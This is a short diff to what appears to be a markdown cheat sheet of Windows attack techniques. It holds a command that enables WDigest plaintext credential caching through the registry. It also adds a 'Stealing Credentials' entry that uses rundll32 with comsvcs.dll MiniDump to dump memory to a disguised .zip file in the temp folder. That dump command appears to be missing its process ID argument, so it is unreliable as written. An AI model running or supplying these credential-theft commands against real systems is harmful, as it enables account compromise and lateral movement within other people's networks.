@@ -33,8 +33,12 @@
   ```
    powershell.exe reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
   ```
-  - Command To Enable WDigest:
+- Command To Enable WDigest:
   ```
   powershell.exe  Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
   ```
-  
+ - Stealing Credentials:
+   ```
+   C:\windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump  C:\windows\temp\logctl.zip full
+   ``` 
+ - 
